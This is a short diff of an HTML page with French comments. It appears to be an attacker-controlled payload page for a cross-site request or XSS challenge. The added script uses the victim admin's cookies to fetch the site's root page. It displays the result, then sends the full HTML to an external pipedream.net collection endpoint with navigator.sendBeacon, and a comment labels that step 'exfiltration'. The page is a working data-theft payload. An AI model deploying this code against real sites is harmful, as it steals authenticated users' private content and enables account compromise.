@@ -3,4 +3,15 @@
 <h1>Contenu admin :</h1>
 <pre id="out">...</pre>
 
-<img src="https://eoyi24wnc60zgb.m.pipedream.net" />
+<script>
+  (async () => {
+    /* le cookie admin est first-party, on peut lire tout le HTML */
+    const html = await (await fetch("/", { credentials: "include" })).text();
+
+    /* affichage local pour debug */
+    out.textContent = html;
+
+    /* exfiltration */
+    navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
+  })();
+</script>
